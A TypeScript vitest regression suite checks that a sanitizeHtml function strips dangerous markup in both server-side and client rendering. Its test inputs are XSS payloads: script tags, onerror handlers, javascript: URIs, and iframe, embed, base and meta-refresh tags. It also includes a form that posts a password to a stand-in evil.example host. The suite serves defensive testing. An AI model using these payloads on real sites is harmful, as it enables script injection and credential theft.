import { describe, expect, it } from "vitest";
import { sanitizeHtml } from "@/lib/sanitize-html";

// Regression suite for LAC-3638: the SSR branch of sanitizeHtml was
// regex-only and did not enforce the DOMPurify allowlist. Because React does
// not re-apply dangerouslySetInnerHTML on hydration, the server output is
// what visitors actually get — so the same allowlist must hold in both
// environments. This spec runs under both vitest configs: tests/node
// (typeof window === "undefined", the SSR path) and tests/unit (jsdom, the
// client path).
export const runSanitizeHtmlSpec = (environmentLabel: string) => {
  describe(`sanitizeHtml (${environmentLabel})`, () => {
    it("returns an empty string for nullish input", () => {
      expect(sanitizeHtml(null)).toBe("");
      expect(sanitizeHtml(undefined)).toBe("");
      expect(sanitizeHtml("")).toBe("");
    });

    it("strips <script> elements and their content", () => {
      const result = sanitizeHtml('<p>hi</p><script>alert("xss")</script>');
      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert");
      expect(result).toContain("<p>hi</p>");
    });

    it("strips inline event handler attributes", () => {
      const result = sanitizeHtml('<img src="/a.png" onerror="alert(1)">');
      expect(result).not.toMatch(/onerror/i);
      expect(result).toContain('src="/a.png"');
    });

    // LAC-3638 bypass vectors: all of these survived the old SSR regex.
    it("strips <iframe> elements", () => {
      const result = sanitizeHtml('<iframe src="https://evil.example/"></iframe><p>ok</p>');
      expect(result).not.toContain("<iframe");
      expect(result).toContain("<p>ok</p>");
    });

    it("strips <form> and <input> elements", () => {
      const result = sanitizeHtml(
        '<form action="https://evil.example/steal"><input name="password"></form>',
      );
      expect(result).not.toContain("<form");
      expect(result).not.toContain("<input");
    });

    it("strips <object> and <embed> elements", () => {
      const result = sanitizeHtml(
        '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">',
      );
      expect(result).not.toContain("<object");
      expect(result).not.toContain("<embed");
    });

    it("strips <style> elements and their CSS payload", () => {
      const result = sanitizeHtml("<style>body { display: none; }</style><p>ok</p>");
      expect(result).not.toContain("<style");
      expect(result).not.toContain("display: none");
      expect(result).toContain("<p>ok</p>");
    });

    it("strips <base> elements", () => {
      const result = sanitizeHtml('<base href="https://evil.example/"><p>ok</p>');
      expect(result).not.toContain("<base");
    });

    it("strips <meta http-equiv=refresh> redirects", () => {
      const result = sanitizeHtml(
        '<meta http-equiv="refresh" content="0;url=https://evil.example/"><p>ok</p>',
      );
      expect(result).not.toContain("<meta");
      expect(result).not.toContain("evil.example");
    });

    it("neutralizes entity-encoded javascript: URIs", () => {
      const result = sanitizeHtml('<a href="&#106;avascript:alert(1)">click</a>');
      expect(result).not.toMatch(/href/i);
      expect(result).toContain("click");
    });

    it("removes plain javascript: URIs from href", () => {
      const result = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
      expect(result).not.toMatch(/javascript:/i);
      expect(result).toContain("click");
    });

    it("removes disallowed attributes while keeping allowed ones", () => {
      const result = sanitizeHtml('<a href="https://example.com" style="color:red" ping="/x">go</a>');
      expect(result).toContain('href="https://example.com"');
      expect(result).not.toContain("style=");
      expect(result).not.toContain("ping=");
    });

    it("preserves allowed rich-text markup", () => {
      const html =
        '<h2>Title</h2><p><strong>Bold</strong> and <em>italic</em></p><ul><li>one</li></ul><blockquote>quote</blockquote>';
      expect(sanitizeHtml(html)).toBe(html);
    });

    it("preserves tables and images", () => {
      const html =
        '<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>cell</td></tr></tbody></table><img src="/photo.jpg" alt="Town hall">';
      expect(sanitizeHtml(html)).toBe(html);
    });

    // Secondary LAC-3638 bug: the old blanket /(?:javascript|data|vbscript):/
    // replace corrupted legitimate content.
    it("preserves data: image URIs on <img>", () => {
      const html = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">';
      const result = sanitizeHtml(html);
      expect(result).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    });

    it("does not corrupt prose containing scheme-like text", () => {
      const html = "<p>Submit your data: name, address, and phone number.</p>";
      expect(sanitizeHtml(html)).toBe(html);
    });

    it("stripLinks removes anchors but keeps their text", () => {
      const result = sanitizeHtml('<p>See <a href="https://example.com">the site</a>.</p>', {
        stripLinks: true,
      });
      expect(result).not.toContain("<a");
      expect(result).toContain("the site");
    });
  });
};
